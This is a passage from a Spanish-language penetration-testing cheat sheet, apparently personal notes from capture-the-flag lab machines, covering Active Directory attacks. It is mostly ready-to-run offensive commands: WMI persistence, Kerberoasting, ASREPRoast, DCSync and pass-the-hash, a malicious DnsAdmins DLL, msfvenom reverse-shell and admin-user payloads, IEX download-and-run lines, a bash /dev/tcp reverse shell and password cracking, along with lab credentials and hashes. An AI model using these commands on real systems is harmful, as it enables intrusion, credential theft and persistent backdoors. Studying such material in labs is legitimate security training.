wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="persistence", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="persistence", ExecutablePath="C:\Windows\Temp\shell.exe",CommandLineTemplate="C:\Windows\Temp\shell.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="persistence"", Consumer="CommandLineEventConsumer.Name="persistence""
```
## Active directory
Comandos y herramientas útiles para enumerar Active directory.
### Kerberos 88 tcp
- Instalar Kerbrute y comandos:
```bash
git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build . # Ya tendría el binario compilado

./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 ../users.txt # Detecta usuarios válidos y comprueba si es vulnerable a un ASREPRoast attack, si lo es nos porporcionará el hash del usuario
```
#### Fuerza bruta Kerberos
```bash
> Fuerza bruta usuarios válidos:
./kerbrute userenum -d scrm.local --dc 10.10.11.168 /usr/share/seclists/Usernames/Names/names.txt

> kerberos_enum_userlists es un repositorio especial para Kerberos:
sudo git clone https://github.com/attackdebris/kerberos_enum_userlists /opt/kerberos_enum_userlists # Tiene varios tipos de listas de usuarios

./kerbrute userenum -d scrm.local --dc 10.10.11.168 ./kerberos_enum_userlists/A-ZSurnames.txt


> Fuerza bruta sobre la password de un usuario:

./kerbrute bruteuser -d scrm.local --dc 10.10.11.168 passwords.txt ksimpson # En este ejemplo se realiza fuerza bruta con un listado de contraseñas sobre el usuario ksimpson
```
#### Kerberoasting Attack
```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 # Para ver si un usuario es vulnerable a un Kerberoasting Attack

GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request # Para obtener un hash e intentar romperlo

john --wordlist=/usr/share/wordlists/rockyou.txt hash
hashcat -a 0 -m 13100 hash /usr/share/wordlists/rockyou.txt

# Si obtenemos la contraseña, comprobamos si es válida con crackmapexec y nos pone Pwn3d!:

crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' # Si me pone Pwn3d! intento conectarme con impacket-psexec
crackmapexec winrm 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' # Si me pone Pwn3d! intento conectarme con evil-winrm

impacket-psexec active.htb/Administrator@10.10.10.100 cmd.exe # Conectarme
```
#### ASREPRoast Attack
```bash
Fuente: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast

impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile ../users.txt # Detecta usuarios válidos y comprueba si es vulnerable a un ASREPRoast attack, si lo es nos porporcionará el hash del usuario

> ASREPRoast attack
# Si obtenemos un hash, podemos intentar romperlo. Metemos el hash en un archivo y probamos a romperlo con john o hashcat:

john --wordlist=/usr/share/wordlists/rockyou.txt hash
hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt 

# Si obtenemos la contraseña, comprobamos si es válida con crackmapexec y nos pone Pwn3d!:

crackmapexec smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' # Si me pone Pwn3d! intento conectarme con impacket-psexec
crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' # Si me pone Pwn3d! intento conectarme con evil-winrm
```
### Rpcclient 135 593 tcp 
- Comandos útiles:
```bash
Fuente: https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
Fuente: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
Fuente: https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc

rpcclient -U '' 10.10.10.175 -N # Conectarme sin credenciales de acceso válidas, con null session
rpcclient -U 'fsmith%Thestrokes23' 10.10.10.175 # Conectarme con credenciales válidas. Poner % ente usuario y contraseña
rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c "lookupsids S-1-5-21-4254423774-1266059056-3197185112-1012" # Autenticarse y ejecutar un comando en la misma linea

enumdomusers # Enumera los usuarios
enumdomgroups # Enumera los grupos
querygroupmem 0x200 # Enumera todos los rid de los los usuarios pertenecientes a este grupo
queryuser 0x1f4 # # Enumera los usuarios por el rid
querydispinfo # Enumera las descripciones de los usuarios
enumprinters # Enumera impresoras conectadas
lookupnames Administrator # Para obtener el SID si conozco el usuario
lookupsids S-1-5-21-4254423774-1266059056-3197185112-1012 # Para obtener el usuario al que corresponde un SID
```
### ldap 389 636 3268 3269 tcp
- Comandos útiles:
```bash
Fuente: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap

ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts # Obtener información. O esto: ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts
ldapsearch -x -H ldap://10.10.10.175 -b DC=EGOTISTICAL-BANK,DC=LOCAL # Obtener información relacionada con un namingcontexts (dn)
```
#### dnstool.py
- Es una herramienta que permite añadir o modificar los registros DNS. En algunas ocasiones esto puede servir para obtener alguna autenticación u otra información a través del servicio LDAP:
```bash
git clone https://github.com/dirkjanm/krbrelayx

python3 dnstool.py -u 'intelligence.htb\tiffany.molina' -p 'NewIntelligenceCorpUser9876' -r webmy -a add -t A -d 10.10.14.8 10.10.10.248 # Para añadir el DNS
sudo responder -I tun0 # Me pongo en escucha con el responder que es un sniffer de tráfico
```
### BloodHound
- Instalar e inicializar:
```bash
sudo apt install neo4j # Ya lo tengo instalado
sudo neo4j console # Inicializo BloodHound y la base de datos 
http://localhost:7474/browser/ # Accedo para cambiar las credenciales. Por defecto son: Usuario = neo4j Password = neo4j y cambio la contraseña

bloodhound # Accedo con las nuevas credenciales
```
- Ahora necesito recopilar información del equipo (Realizado en PowerShell), 2 formas de hacerlo:
```bash
> 1º Forma SharpHound.exe

Descargar:https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
upload /home/kali/Desktop/SharpHound.exe # Subo el archivo
.\SharpHound.exe # Ejecuto el binario que me creará un comprimido .zip que me tengo que descargar para usar con BloodHound
download C:\Users\svc_loanmgr\Documents\20221024214246_BloodHound.zip BloodHound.zip # Me descargo el comprimido y lo subo a BloodHound desde la pestaña upload data del menú de la derecha

> 2º Forma SharpHound.ps1

wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1 # Descargar: https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1
upload /home/kali/Desktop/SharpHound.ps1 # Subo el archivo
Import-Module .\SharpHound.ps1 # Importo el módulo
Invoke-BloodHound -CollectionMethod All # Invoco la función que me creará un comprimido .zip que me tengo que descargar para usar con BloodHound
download C:\Windows\Temp\Privesc\20221024182439_BloodHound.zip BloodHound.zip # Me descargo el comprimido y lo subo a BloodHound desde la pestaña upload data del menú de la derecha
```
#### BloodHound python
- Es una herramienta parecida a BloodHound, pero en este caso, la puedo ejecutar desde mi equipo sin necesidad de subirla a la máquina objetivo, aunque si necesito tener credenciales válidas:
```bash
mkdir bloodhound 
git clone https://github.com/fox-it/BloodHound.py
python3 bloodhound.py -c All -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.10.10.248 -d intelligence.htb # Ejecutar la herramienta para recolectar toda la información disponible
# Después de ejecutar la herramienta se me creará una carpeta nueva, probablemente llamada BloodHound.py y dentro de ella se habrán creado varios archivos .json. Esos archivos .json son los que tengo que subir a la herramienta BloodHound para analizar su contenido
```
#### ldapdomaindump
- Es una herramienta para enumerar el equipo y obtener información del Directorio Activo:
```bash
mkdir ldapdomaindump # Crear una carpeta para gestionar el output de la herramienta
cd ldapdomaindump
ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.10.10.161
python2 -m SimpleHTTPServer 80 # Abro un servidor para acceder al contenido desde el navegador: http://localhost/
```
### Laps
#### Laps Dump
- Para dumpear información de Laps (Local Administrator Password Solution) que es una herramienta de Microsoft para la gestion de contaseñas.
#### LAPSDumper
- Si tengo crecenciales de un usuario que está en el grupo LAPS_Readers o Domain Users, primero me descargo la herramienta LAPSDumper: https://github.com/n00py/LAPSDumper y la ejecuto en mi equipo:
```bash
python3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
```
#### Get-LAPSPasswords
- Si estoy en un equipo como un usuario dentro de los grupos LAPS_Readers o Domain Users puedo intentar dumpearme todas las credenciales almacenadas en el elquipo de admistradores locales:
```bash
git clone https://github.com/kfosaaen/Get-LAPSPasswords # Clono el repositorio y me abro un servidor con python
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/Get-LAPSPasswords.ps1') # Subir el archivo
Get-LAPSPasswords # Después pongo esto para ejecutarlo
```
#### Crackmapexec
- Tampién puedo intentar extraer información de Laps con crackmapexec:
```bash
crackmapexec smb 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --laps
```
- Tampién puedo intentar extraer información de Lsa secrets con crackmapexec:
```bash
crackmapexec smb 10.10.10.40 -u 'Administrator' -H 'cdf51b162460b7d5bc898f493751a0cc' --lsa
```
### DCSync Attack
- Si el usuario tiene acceso a GetChanges y GetChangesAll sobre el dominio, se puede intentar realizar un DCSync Attack para obtener los hashes y poder hacer Pass The Hash con impacket-psexec:
```bash
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175' 
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175 # Otra forma de hacerlo, primero pongo este comando y después la contraseña

impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 -hashes :823452073d75b9d1cf70ebdf86c7f98e # Pass The Hash con impacket-psexec
```
### gpp decrypt
- gpp-decrypt es un script en Ruby que sirve para descifrar la cadena de `Group Policy Preferences` dentro del archivo `Groups.xml`:
```bash
C:\Windows\SYSVOL\domain\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml # Reviso el directorio SYSVOL para ver si encuentro el archivo Groups.xml Para intentar romper el hash que contiene

gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" #  Para romper el hash, gpp-decrypt es un desencriptador para este tipo de hashes
```
## Grupos
#### Account Operators
- Si estoy dentro del grupo Account Operators puedo crear nuevos usuarios e incorporarlos dentro de grupos.
- Ejemplo máquina Forest. Al estar el usuario dentro del grupo Account Operators, este puede crear un nuevo usuario que se va a incorporar al grupo `Exchange Windows Permissions` para abusar de WriteDalc (Discretionary Access Control List) y realizar un DCSync Attack:
```bash
> Crear un nuevo usuario:
net user Mario Mario123$! /add /domain # Crea un nuevo usuario a nivel de dominio
net group # Ver los grupos existentes
net group "Exchange Windows Permissions" Mario /add # Añadir el usuario al grupo Exchange Windows Permissions

> Asignar al usuario Mario los privilegios de DCSync:
$SecPassword = ConvertTo-SecureString 'Mario123$!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\Mario', $SecPassword)

wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
upload /home/kali/Desktop/PowerView.ps1

Import-Module .\PowerView.ps1
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity Mario -Rights DCSync

secretsdump.py 'Mario:Mario123$!@10.10.10.161' # Realizo el DCSync Attack para obtener los hashes y poder hacer Pass The Hash

crackmapexec winrm 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6' # Si me pone Pwn3d! intento conectarme con evil-winrm

evil-winrm  -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```
#### Azure Admins
- Puede que sea posible listar alguna credencial en texto plano que me permita escalar privilegios:
```bash
Fuente: https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/
C:\Program Files\Microsoft Azure AD Sync # Confirmar que en el sistema se encuentra el Microsoft Azure AD Sync

Descargar .zip: https://github.com/VbScrub/AdSyncDecrypt/releases
Descomprimo el .zip y subo a la máquina objetivo los archivos: AdDecrypt.exe y mcrypt.dll

cd "C:\Program Files\Microsoft Azure AD Sync\Bin" # Ahora me sitúo en este directorio
C:\windows\temp\AdDecrypt.exe -FullSQL # Ejecuto el siguiente comando para obtener la credencial, compruebo si es válida e intento conectarme con evil-winrm o impacket-psexec
```
#### DnsAdmins
- Si un usuario está dentro de este grupo puedo intentar crear una dll maliciosa que me permita escalar privilegios:
```bash
Fuente: https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=443 -f dll -o shell.dll # Creo la dll maliciosa
impacket-smbserver smbFolder $(pwd) -smb2support # Me comparto la dll con un recurso compartido con smbserver

dnscmd.exe /config /serverlevelplugindll \\10.10.14.9\smbFolder\shell.dll # Ejecuto el siguiente comando
sc.exe stop dns # Paro el servicio dns
sc.exe start dns # Ahora me pongo en escucha y al arrancar de nuevo el servicio tendría que obtener una shell (puede que sea necesario realizar el proceso varias veces)
```
#### GMSA
```bash
git clone https://github.com/micahvandeusen/gMSADumper

python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb # Ejecutar para dumpear el hash
```
#### Event Log Readers
- Los miembros del grupo Event Log Readers pueden leer los registros de eventos en el equipo local.
##### Get-WinEventData.ps1
- Con este script podemos acceder al registro de eventos y gracias a esto podríamos ver información importante que quedase registrada al crear algún proceso 
```bash
Descargar: https://github.com/RamblingCookieMonster/PowerShell/blob/master/Get-WinEventData.ps1  
Lista de eventos: https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/

Evento: Nuevo proceso creado Id 4688: https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4688

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/Get-WinEventData.ps1') # Me lo comparto con un servidor con python y ejecuto este comando para que interprete el script

Get-WinEvent -FilterHashtable @{Logname='security';id=4688} -MaxEvents 1 | Get-WinEventData | fl * # Ver la información del último proceso creado, si quiero ver más procesos modifico el parámetro -MaxEvents

Get-WinEvent -FilterHashtable @{Logname='security';id=4688} | Get-WinEventData | Select e_CommandLine | ft -AutoSize # Ver la información que aparece en el campo e_CommandLine de todos los procesos creados
```
## Msfvenom Payloads
- Fuente: https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
- Fuente: https://github.com/frizb/MSF-Venom-Cheatsheet

- Con este payload intento conseguir una reverse shell.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.80.129 LPORT=443 --platform windows -a x86 -b "\x00\x0a\x0d" -f c EXITFUNC=thread
# Me pongo en escucha y lanzo el exploit
```
- Con este payload intento conseguir una reverse shell (powershell) con el Invoke-PowerShellTcp.ps1:
```bash
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.80.129/Invoke-PowerShellTcp.ps1')" -f c -a x86 --platform windows EXITFUNC=thread -b "\x00\x0a\x0d"

# Me comparto el archivo Invoke-PowerShellTcp.ps1 que ya tengo modificado en el repositorio con un servidor en python, me pongo en escucha y lanzo el exploit
```
- Con este payload se crea un usuario y se realiza la configuración suficiente para conectarme con impacket-psexec:
```bash
> Payload:
msfvenom -p windows/exec CMD="C:\Windows\System32\cmd.exe /c net user myus3rk4li 56A46D.78sds /add && net localgroup Administrators myus3rk4li /add && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f && net share myFolder=C:\Windows\Temp /GRANT:Administrators,FULL" --platform windows -a x86 -b "\x00\x0a" -f c EXITFUNC=thread

impacket-psexec WORDKGROUP/myus3rk4li@192.168.80.130 cmd.exe # Ahora me intento conectar con impacket-psexec, después pongo la contraseña 56A46D.78sds
```
- Con este payload se crea un usuario y se realiza la configuración suficiente para conectarme con impacket-psexec:
```bash
> Primero este Payload:
msfvenom -p windows/adduser USER=testadmin PASS=Password123! WMIC=true -b "\x00\x0a" -f c EXITFUNC=thread

> Después el segundo Payload:
Este:
msfvenom -p windows/exec CMD="C:\Windows\System32\cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f && net share myFolder=C:\Windows\Temp /GRANT:Administrators,FULL" --platform windows -a x86 -b "\x00\x0a" -f c EXITFUNC=thread
O este:
msfvenom -p windows/exec CMD="C:\Windows\System32\cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" --platform windows -a x86 -b "\x00\x0a" -f c EXITFUNC=thread

impacket-psexec WORDKGROUP/testadmin@192.168.77.131 cmd.exe  # Ahora me intento conectar con impacket-psexec, después pongo la contraseña Password123!
```
- Con este payload intento conseguir una reverse shell con el miexec:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.80.129 LPORT=443 -f msi -o reverse.msi # Creo un archivo .msi, me lo comparto con un servidor con python y me pongo en escucha
msfvenom -p windows/exec CMD="msiexec /q /i http://192.168.80.129/reverse.msi" -f c -a x86 --platform windows EXITFUNC=thread -b "\x00\x0a\x0d" # Creo el payload para incluirlo en el exploit
```
- Con estos payloads abro el puerto RDP para conectarme por ejemplo con rdesktop:
```bash
> 1º Forma si tengo credenciales válidas:
crackmapexec smb 192.168.80.130 -u 'myus3rk4li' -p '56A46D.78sds'  -M rdp -o action=enable

> 2º Forma si tengo credenciales válidas:
msfvenom -p windows/exec CMD="C:\Windows\System32\cmd.exe /c netsh advfirewall firewall add rule name=\"RDP port\" protocol=TCP dir=in localport=3389 action=allow && netsh advfirewall firewall add rule name=\"RDP port\" protocol=TCP dir=out localport=3389 action=allow && reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f" --platform windows -a x86 -b "\x00\x0a" -f c EXITFUNC=thread

> 3º Forma si no tengo credenciales válidas:
Este:
msfvenom -p windows/exec CMD="C:\Windows\System32\cmd.exe /c net user myus3rk4li 56A46D.78sds /add && net localgroup Administrators myus3rk4li /add && netsh advfirewall firewall add rule name=\"RDP port\" protocol=TCP dir=in localport=3389 action=allow && netsh advfirewall firewall add rule name=\"RDP port\" protocol=TCP dir=out localport=3389 action=allow && reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f" --platform windows -a x86 -b "\x00\x0a" -f c EXITFUNC=thread

O este (con este tambíen me podría conectar con impacket-psexec):
msfvenom -p windows/exec CMD="C:\Windows\System32\cmd.exe /c net user myus3rk4li 56A46D.78sds /add && net localgroup Administrators myus3rk4li /add && netsh advfirewall firewall add rule name=\"RDP port\" protocol=TCP dir=in localport=3389 action=allow && netsh advfirewall firewall add rule name=\"RDP port\" protocol=TCP dir=out localport=3389 action=allow && reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" --platform windows -a x86 -b "\x00\x0a" -f c EXITFUNC=thread

> Para conectarme:
rdesktop 192.168.80.130 -u 'myus3rk4li' -p '56A46D.78sds'
```
## Herramientas
### Password Guessing and Cracking Passwords
#### Hydra
```bash
hydra -L users.txt -P password.txt -f -o ftphydra.txt -u 10.10.10.37 -s 21 ftp
-t 20 # Hilos
```
- Otra forma de usar hydra si conocemos el usuario:
```bash
hydra -l nombreusuario -P larutadelrockyou.txt ssh://laipvictima -vV
```
#### Medusa
```bash
medusa -U users.txt -P password.txt -e ns -h 10.10.10.37 - 22 -M ssh
```
- Otra forma de usar medusa si conocemos el usuario (en este ejemplo root):
```bash
medusa -h laipvictima -u root -P rutadiccionariorockyou.txt -M ftp -v 10
```
#### John
- Rutas útiles:
```bash
/home/kali/.john/john.pot
/home/kali/.john/john.log
```
- Con unshadow uno el contenido de `etc/passwd` y `etc/shadow` y después intento descifrarlo con john:
```bash
unshadow etc/passwd etc/shadow > hash # Después utilizar john
```
- Si tenemos una id_rsa con contraseña podemos intentar romperla con sshjohn:
```bash
/usr/share/john/ssh2john.py id_rsa > hash # Primero creo el archivo hash 
john --wordlist=/usr/share/wordlists/rockyou.txt hash # Después intentamos romper el hash
```
- Este comando es para intentar romper un hash y ver la contraseña en texto plano:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=NT
https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats # Aquí puedo ver el código de todos los formatos
```
- Ejemplo de crackeo del archivo `shadow`:
```bash
john /etc/shadow --wordlist=/root/Desktop/wordlists/1000000-password-seclists.txt
```
- Para extraer la contraseña de un `documento office`:
```bash
/usr/share/john/office2john.py MS_Word_Document.docx > hash
john --wordlist=/root/Desktop/wordlists/1000000-password-seclists.txt hash # Después esto
```
- fcrackzip, archivo zip protegido con contraseña:
```bash
fcrackzip -b -D -u -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip
```
- zip2john, archivo zip protegido con contraseña:
```bash
zip2john winrm_backup.zip > hashzip # Primero obtengo el hash
john --wordlist=/usr/share/wordlists/rockyou.txt hashzip # Después rompo el hash con john
```
- pfx2john, archivo pfx protegido con contraseña:
```bash
pfx2john legacyy_dev_auth.pfx > hashpfx # Primero obtengo el hash
john --wordlist=/usr/share/wordlists/rockyou.txt hashpfx # Después rompo el hash con john
```
#### Hashcat
- Hashcat `esto es por fuerza bruta -a 0` y `esto es el método -m 500`. Todos los métodos (https://hashcat.net/wiki/doku.php?id=example_hashes):
```bash
hashcat -a 0 -m 500 hash /usr/share/wordlists/rockyou.txt

hashcat -a 0 -m 10900 hash /usr/share/wordlists/rockyou.txt --user # Poner --user cuando pongo el usuario al principio del hash
hashcat -a 0 -m 10900 --show hash --user # Si el archivo tiene varios hashes y usuarios con --show puedo ver a quién pertenece la contraseña encontrada
```
- Si no se el hash-mode que tengo que poner `-m`, puedo intentar identificarlo, primero pongo en hash en un archivo y despues:
```bash
hashcat --identify hash
hash-identifier # Y después el hash
hashid hash

hashcat --example-hashes | grep PBKDF2-HMAC-SHA256 -C 2 # Para intentar saber el código (mode -m) del hash que tengo
```
- Para crear variaciones de una contraseña podemos poner una contraseña dentro un archivo en este caso pass y utilizar el siguente comado:
```bash
hashcat --stdout pass -r /usr/share/hashcat/rules/best64.rule 
```
#### Crunch
- Es para crear un diciconario en base a los datos que le demos. Cuidado, si ponemos muchos caracteres pesa mucho, incluso TB:
```bash
man crunch

> En este ejemplo hemos indicado que lo que cree tenga entre 2 y 4 caracteres, con las letras y números (k54n45) y que el resultado lo exporte al archivo passwords
crunch 2 4 k54n45 -o passwords

> En este ejemplo hemos indicado que lo que cree tenga 6 caracteres, que empieze por casa y que tenga dos caracteres más, el primero letras maúsculas y el segundo números y que el resultado lo exporte al archivo passwords
crunch 6 6 -t casa,% > password

-t # Para añadir alguna de las variaciones siguientes
@ # Letras en minúscula
, # Letras en mayúscula
% # Números
^ # Símbolos
```
#### bkcrack
- bkcrack, descifra la contraseña comparando los archivos con los de mi sistema
```bash
> Instalación:
sudo git clone https://github.com/kimci86/bkcrack /opt/bkcrack

# Ahora estanto como root dentro de la carpeta /opt/bkcrack ejecuto los tres comandos a la vez:

cmake -S . -B build -DCMAKE_INSTALL_PREFIX=install
cmake --build build --config Release
cmake --build build --config Release --target install
```
```bash
uso: -C ComprimidoEncriptado -c archivoEncriptadodentrodelComprimido -P archivoDeMiSistemaComprimido -p archivoDeMiSistemaSinComprimir

sudo bkcrack -C uploaded-file-3422.zip  -c .bash_logout -P bash_logout.zip  -p bash_logout 
sudo bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U uploaded-file-3422-pass.zip pass # Después cuando tenga las keys, pongo el siguiente comando, donde la nueva contraseña será "pass" 
7z x file.zip # Una vez desencriptado lo descomprimo por ejemplo con 7z
```
#### Passpipe
- Passpie es una herramienta para administrar contraseñas:
```bash
Fuente: https://github.com/marcwebbie/passpie

passpie list # Ver cuantas keys hay
gpg2john .keys > hash # Descargar el archivo .keys e intentar crackear el hash (Formato PGP) 
john --wordlist=/usr/share/wordlists/rockyou.txt hash
touch pass # Si consigo crackearlo creo un archivo
passpie export pass # Exporto el contenido al archivo creado (me pedirá la contraseña crackeada)
cat pass # Aquí tendrían que estar las passwords
```
#### keepass
- Si me encuentro un archivo con la extensión .kdbx es un archivo de keepass y puedo intentar abrirlo así:
```bash
> keepassxc:
keepassxc el archivo.kdbx

> kpcli:
kpcli --kdb CEH.kdbx # Entrar en el archivo
find . # Ver el contenido
show -f 0 # Ver la posición 0
```
- Si tiene contraseña puedo intentar averiguarla con keepass2john:
```bash
> keepass2john:
keepass2john nombrearchivo.kdbx > hash # Primero creo el hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash # Después rompo el hash

> hashcat:
hashcat hash /usr/share/wordlists/rockyou.txt --user # Poner --user cuando pongo el usuario al principio del hash, ejemplo keepass, de esta forma también te identifica el tipo de hash
```
#### Otros
- Para crear un diciconario en base al contenido de una web:
```bash
cewl -w diccionario.txt http://10.10.10.191/ --with-numbers
```
- Sucrack, primero creamos un diccionario y lo subimos a la máquina objetivo junto con el binario, le damos permiso de ejecucion (ejemplo con root):
```bash
./sucrack -w 20 -u root pass.txt # Después si nos devuelve una contraseña correcta hacemos `su root`
```
- Para crackear una contraseña de ssh con nmap:
```bash
nmap -p 22 --script ssh-brute --script-args userdb=/<DICIONADIODEUSUARIOS> <IP>
/usr/share/nmap/nselib/data/passwords.lst # Este es el diccionario que usa por defecto
```
- Para crackear una contraseña con `metasploit` usar el módulo:
```bash
auxiliary/scanner/ssh/ssh_login # Después seleccionar el dicionario
/usr/share/wordlists/metasploit/root_userpass.txt # Lanzar el run
```
- cryptsetup
```bash
sudo cryptsetup luksOpen ../backup.img output_backup # Si me pide contraseña puedo utilizar fuerza bruta
sudo mkdir /mnt/output_backup
sudo mount /dev/mapper/output_backup /mnt/output_backup
cd /mnt/output_backup # Ver ya el contenido desencriptado
```
- luks bruteforce
```bash
sudo apt install dh-autoreconf
sudo apt install libcryptsetup-dev

git clone https://github.com/glv2/bruteforce-luks
cd bruteforce-luks
./autogen.sh
./configure
make

./bruteforce-luks -t 50 -f /usr/share/wordlists/rockyou.txt ../backup.img
```
#### OpenSSL
- Comandos útiles
```bash
openssl passwd # Para generar una nueva contraseña
openssl req -in req.txt -text # Ver el contenido de un certificado en formato texto


> Exportar certificado y clave privada (Válidos para una conexión con evil-winrm)
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key # Para exportar la key a un archivo
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt # Para exportar la key a un archivo

> Otra forma de exportar certificado y clave privada (Válidos para una conexión con evil-winrm)
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem

> Encriptar y desencriptar con OpenSSL
openssl aes-256-cbc -d -in Info.enc # Para desencriptar un archivo encriptado con OpenSSL				 
openssl aes-256-cbc -in Info -out Info.enc # Para encriptar un archivo con OpenSSL
```
- Para desencriptar un archivo aplicando fuerza bruta:
 ```bash
bruteforce-salted-openssl -t q0 -f /usr/share/wordlists/rockyou.txt -c aes256 -d sha256 drupal.enc
```
- Con OpenSSL me puedo intentar conectar a puertos ssl/algo como por ejemplo el `110,143,993,995` para ver si puedo obtener alguna información:
```bash
openssl s_client -connect 10.10.10.120:993
```
### BurpSuite
- Url encodea: `control + u`
- Uurl decodea: `control + shift + u`
- Base64 decodea: `control + b`
- Base64 encodea: `control + shift + b`
- Para que una petición desde la terminal pase por burpsuite pongo al final `--proxy http://127.0.0.1:8080/` por ejemplo:
```bash
curl -s -X POST "http://10.10.11.131/" -H "Content-Type: application/json" -d '{"siteurl": "{{7*7}}"}' --proxy http://127.0.0.1:8080/
```
### Metasploit
```bash
sudo msfdb run
search elservicio # Buscar un exploit dentro de Metasploit
searchsploit elservicio # Buscar un exploit fuera de Metasploit
use elexploit o larutadelexploit # Usar un exploit
set RHOSTS aquiponerlaipobjetivo
set LHOST  aquiponernuestraip
set PAYLOAD aquiponerelpayload
show PAYLOADS # Ver los payloads disponibles
run o exploit # Ejecutar exploit
sessions elnumero # Si me abre una sesión, pongo sessions para ver todas las sesiones abiertas
getuid # Saber quien soy
getsystem # Puedo intentar escalar privilegios
sysinfo # Ver información del sistema
background # Enviar una sesión de meterpreter a un segundo plano
sessions # Ver sodas las sesiones activas
set session Numerodesesion # Seleccionar una de ellas
sessions -K # Eliminar todas las sesiones abiertas
info # Ver toda la información sobre un exploit que tengo selecionado
connect laip elpuerto (ejemplo: connect 127.0.0.1 443) # Si me quiero conectar con metasploit a una conexión ya abierta
use exploit/multi/handler # Recibir coneciones externas con metasploit
irb # Para que se me abra una consola en ruby, en la que puedo ejecutar comandos como: system("chmod u+s /bin/bash");  o  exec("bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'");
```
- Para crear una puerta trasera, primero salgo de meterpreter con background y después indico la sesión que quiero usar:
```bash
exploit/windows/local/persistence_service
```
- Para usar una puerta trasera creada:
```bash
use exploit/multi/handler # Primero
